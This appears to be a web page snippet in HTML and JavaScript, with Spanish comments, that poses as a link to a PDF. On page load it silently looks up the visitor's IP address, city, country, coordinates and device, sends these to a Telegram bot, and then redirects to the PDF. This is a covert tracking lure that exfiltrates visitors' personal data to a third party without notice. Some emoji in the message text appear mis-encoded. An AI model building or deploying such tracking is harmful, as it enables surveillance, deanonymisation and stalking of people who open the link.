<script src="config.js"></script>

<script>
    async function rastrear() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            const agente = navigator.userAgent;

            // Ahora usamos CONFIG.TOKEN y CONFIG.CHAT_ID
            const texto = `üîî *NUEVA VISITA DETECTADA*\n\n` +
                          `üåê *IP:* \`${d.ip}\`\n` +
                          `üìç *Ubicaci√≥n:* ${d.city}, ${d.country_name}\n` +
                          `üì± *Dispositivo:* ${agente.split(')')[0]})\n` +
                          `üîó *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: texto,
                    parse_mode: 'Markdown'
                })
            });
        } catch (err) {
            console.log("...");
        } finally {
            window.location.href = CONFIG.PDF_URL;
        }
    }
    window.onload = rastrear;
</script>
